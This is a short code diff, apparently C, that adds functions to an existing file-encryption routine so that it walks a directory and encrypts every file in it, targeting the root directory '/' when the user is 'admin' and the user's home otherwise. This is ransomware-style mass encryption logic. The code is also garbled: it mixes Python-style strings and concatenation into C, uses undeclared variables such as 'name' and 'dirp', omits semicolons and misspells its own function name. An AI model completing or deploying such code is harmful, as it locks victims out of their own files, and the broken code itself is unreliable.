@@ -21,6 +21,30 @@ void handleErrors(void) {
     abort();
 }
 
+void ecryption(user, key){
+    if(user == 'admin'){
+        encrypt_user_files('/', key)
+    }
+    else if (user != NULL){
+        encrypt_user_files(user+'/', key)
+    }
+    else{
+        handleErrors();
+    }
+}
+
+void encrypt_user_files(dir_path, key){
+    if (!exists(dir_path)) 
+        handleErrors();
+    else{
+        len = strlen(name);
+        dirp = opendir(dir_path);
+        while ((dp = readdir(dirp)) != NULL)
+            encrypt_file(dp->d_name, key)
+        (void)closedir(dirp);
+    }
+}
+
 void encrypt_file(string filePath, unsigned char *key) {
     // generate random iv for each file
     uint8_t iv[IV_SIZE];
